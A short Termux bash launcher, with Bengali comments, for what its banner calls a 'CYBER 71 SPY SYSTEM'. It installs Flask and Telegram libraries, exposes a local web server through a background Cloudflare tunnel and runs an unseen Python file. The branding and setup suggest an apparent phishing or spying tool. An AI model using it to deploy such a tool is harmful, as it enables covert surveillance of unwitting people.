#!/bin/bash

# স্ক্রিন পরিষ্কার করা
clear

# ব্যানার প্রদর্শন
echo -e "\e[1;32m"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "      CYBER 71 SPY SYSTEM - OWNER: ENAFUL   "
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "\e[0m"

# প্রয়োজনীয় লাইব্রেরি চেক ও ইনস্টল
echo -e "\e[1;34m[*] Checking System Requirements...\e[0m"
pkg update -y
pkg install python -y
pip install flask requests python-telegram-bot

# টার্মাক্স সচল রাখা
termux-wake-lock

# ব্যাকগ্রাউন্ডে ক্লাউডফ্লেয়ার টানেল চালু করা (যদি ইনস্টল থাকে)
echo -e "\e[1;34m[*] Starting Tunneling Service...\e[0m"
nohup cloudflared tunnel --url http://127.0.0.1:5000 > /dev/null 2>&1 &
sleep 5

# আপনার পাইথন ফাইলটি রান করা
echo -e "\e[1;32m[+] Launching ENAFUL_39.py...\e[0m"
python ENAFUL_39.py

